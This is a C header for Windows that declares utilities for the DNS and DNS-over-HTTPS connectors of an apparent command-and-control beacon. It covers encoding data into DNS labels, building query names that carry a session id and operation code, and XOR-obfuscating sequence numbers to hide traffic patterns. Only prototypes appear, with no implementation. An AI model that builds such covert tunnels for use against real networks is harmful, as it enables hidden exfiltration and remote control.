#ifndef DNS_UTILS_H
#define DNS_UTILS_H

#include <windows.h>
#include "ApiDefines.h"

// ============================================================================
// DNS Utility Functions - Shared between ConnectorDNS and ConnectorDoH
// ============================================================================

// Convert a 32-bit value to hex string (8 chars + null terminator)
void DnsToHex32(ULONG value, CHAR out[9]);

// Base32 encode binary data for DNS labels (RFC 4648)
// Returns encoded length, 0 on error
ULONG DnsBase32Encode(const BYTE* src, ULONG srcLen, CHAR* dst, ULONG dstSize);

// Base32 decode DNS labels back to binary
// Returns decoded length, 0 on error
ULONG DnsBase32Decode(const CHAR* src, ULONG srcLen, BYTE* dst, ULONG dstSize);

// Build DNS QNAME from components: <sid>.<op>.<seq_hex>.<idx_hex>.<dataLabel>.<domain>
// seq/idx are XOR-obfuscated to hide incremental patterns
void DnsBuildQName(const CHAR* sid, const CHAR* op, ULONG seq, ULONG idx, 
                   const CHAR* dataLabel, const CHAR* domain, CHAR* out, ULONG outSize);

// Encode hostname to DNS wire format: "a.b.c" -> [1]a[1]b[1]c[0]
// Returns encoded length, -1 on error
int DnsEncodeName(const CHAR* host, BYTE* buf, int bufSize);

// Build data labels from binary: splits Base32-encoded data into DNS labels
// Each label is at most labelSize chars (max 63 per DNS spec)
BOOL DnsBuildDataLabels(const BYTE* src, ULONG srcLen, ULONG labelSize, 
                        CHAR* out, ULONG outSize);

// Standard Base64 decode
// Returns decoded length
int DnsBase64Decode(const CHAR* src, int srcLen, BYTE* dst, int dstMax);

// ============================================================================
// Debug Logging - Shared log function for DNS/DoH connectors
// ============================================================================

// Log a message to ax_dns_beacon.log in the executable directory
// Includes relative timestamp since first log call
void DnsDebugLog(const char* msg);

// Formatted log with printf-style arguments
void DnsDebugLogf(const char* fmt, ...);

// Log raw hex data with direction indicator (TX/RX)
void DnsDebugLogHex(const char* direction, const BYTE* data, ULONG len);

#endif // DNS_UTILS_H
